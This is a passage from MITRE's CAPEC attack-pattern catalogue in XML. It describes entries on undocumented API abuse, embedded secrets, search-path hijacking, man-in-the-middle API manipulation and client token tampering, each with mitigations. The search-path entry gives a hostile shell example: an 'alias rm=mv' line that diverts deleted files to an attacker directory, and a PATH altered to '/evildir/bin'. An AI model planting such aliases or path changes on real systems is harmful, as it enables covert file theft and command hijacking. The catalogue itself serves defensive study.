            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="113"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.</Description>
               <Technique>Search via internet for known, published services.</Technique>
               <Technique>Use automated tools to scan known ports to identify internet-enabled services.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Authenticate to service] Authenticate to the service, if required, in order to explore it.</Description>
               <Technique>Use published credentials to access system.</Technique>
               <Technique>Find unpublished credentails to access service.</Technique>
               <Technique>Use other attack pattern or weakness to bypass authentication.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Explore</Phase>
               <Description>[Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.</Description>
               <Technique>For any published services, determine exposed interfaces via the documentation provided.</Technique>
               <Technique>For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.</Description>
               <Technique>Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.</Technique>
               <Technique>Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.</Description>
               <Technique>Execute features that are not intended to be used by general system users.</Technique>
               <Technique>Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed, the attacker does not need to know much more in addition to the format of web service messages that he can sniff/monitor for.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticating both services and their discovery, and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means, including: 1) protecting the channel over which authentication occurs, 2) preventing the theft, forgery, or prediction of authentication credentials or the resultant tokens, or 3) subversion of password reset and the like.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers "will not know services exist" and that "even if they did, they wouldn't be able to access them because they're not on the local LAN." Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="306"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="695"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Using Unpublished Web Service APIs</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="37" Name="Retrieve Embedded Sensitive Data" Abstraction="Detailed" Status="Draft">
         <Description>An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="167"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.</Description>
               <Technique>Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.</Technique>
               <Technique>Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Apply mining techniques] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to extract the information of interest.</Description>
               <Technique>API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.</Technique>
               <Technique>Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.</Technique>
               <Technique>Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.</Technique>
               <Technique>Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, he attempts decoding in that format.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>In order to feasibly execute this type of attack, some valuable data must be present in client software.</Prerequisite>
            <Prerequisite>Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as "Strings" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.</Example>
            <Example>An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.</Example>
            <Example>Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="311"/>
            <Related_Weakness CWE_ID="525"/>
            <Related_Weakness CWE_ID="312"/>
            <Related_Weakness CWE_ID="314"/>
            <Related_Weakness CWE_ID="315"/>
            <Related_Weakness CWE_ID="318"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Lifting Data Embedded in Client Distributions</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="38" Name="Leveraging/Manipulating Configuration File Search Paths" Abstraction="Detailed" Status="Draft">
         <Description>This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="159"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must be able to write to redirect search paths on the victim host.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To identify and execute against an over-privileged system interface</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Ensure that the program's compound parts, including all system dependencies, classpath, path, and so on, are secured to the same or higher level assurance as the program</Mitigation>
            <Mitigation>Implementation: Host integrity monitoring</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Another method is to redirect commands by aliasing one legitimate command to another to create unexpected results. the Unix command "rm" could be aliased to "mv" and move all files the victim thinks they are deleting to a directory the attacker controls. In a Unix shell .profile setting</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">alias rm=mv /usr/home/attacker</xhtml:div>
               <xhtml:p>In this case the attacker retains a copy of all the files the victim attempts to remove.</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>A standard UNIX path looks similar to this</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin</xhtml:div>
               <xhtml:p>If the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attackers' behalf:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">/evildir/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin</xhtml:div>
               <xhtml:p>This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="426"/>
            <Related_Weakness CWE_ID="427"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Examples-Instances, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="383" Name="Harvesting Information via API Event Monitoring" Abstraction="Detailed" Status="Draft">
         <Description>An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a "virtual sale" of rare items. As other users enter the event, the attacker records via MITM proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource/>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The adversary is able to gather information to potentially support further nefarious activities.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="311"/>
            <Related_Weakness CWE_ID="319"/>
            <Related_Weakness CWE_ID="419"/>
            <Related_Weakness CWE_ID="602"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Harvesting Usernames or UserIDs via Application API Event Monitoring</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="384" Name="Application API Message Manipulation via Man-in-the-Middle" Abstraction="Meta" Status="Draft">
         <Description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system. Despite the use of MITM software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true "Man-in-the-Middle" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="471"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="385" Name="Transaction or Event Tampering via Application API Manipulation" Abstraction="Standard" Status="Draft">
         <Description>An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="384"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="471"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="386" Name="Application API Navigation Remapping" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="385"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="471"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="387" Name="Navigation Remapping To Propagate Malicious Content" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the destination of various application interface elements.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="386"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="471"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="388" Name="Application API Button Hijacking" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="386"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Example_Instances>
            <Example>
               <xhtml:p>An in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">[Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link]</xhtml:div>
               <xhtml:p>By altering the destination of "Claim_Link" to point to the attackers' server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking "Yes" or "No" causes the user to load the attackers' code.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="471"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Examples-Instances</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="389" Name="Content Spoofing Via Application API Manipulation" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="384"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Targeted software is utilizing application framework APIs</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="353"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-327"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="39" Name="Manipulating Opaque Client-based Data Tokens" Abstraction="Standard" Status="Draft">
         <Description>In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="22">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions</Description>
               <Technique>Use WebScarab to reveal hidden fields while browsing.</Technique>
               <Technique>Use a sniffer to capture packets</Technique>
               <Technique>View source of web page to find hidden fields</Technique>
               <Technique>Examine URL to see if any opaque tokens are in it</Technique>
               <Technique>Disassemble or decompile client-side application</Technique>
               <Technique>Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.</Description>
               <Technique>Look for signs of well-known character encodings</Technique>
               <Technique>Look for cryptographic signatures</Technique>
               <Technique>Look for delimiters or other indicators of structure</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values</Description>
               <Technique>Modify tokens logically</Technique>
               <Technique>Modify tokens arithmetically</Technique>
               <Technique>Modify tokens bitwise</Technique>
               <Technique>Modify structural components of tokens</Technique>
               <Technique>Modify order of parameters/tokens</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server</Description>
               <Technique>Use network-level packet injection tools such as netcat</Technique>
               <Technique>Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.</Technique>
               <Technique>Use modified client (modified by reverse engineering)</Technique>
               <Technique>Use debugging tools to modify data in client</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.</Prerequisite>
            <Prerequisite>For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">If the client site token is obfuscated.</Skill>
            <Skill Level="High">If the client site token is encrypted.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic "message authentication code" (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a "malicious" value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.</Mitigation>
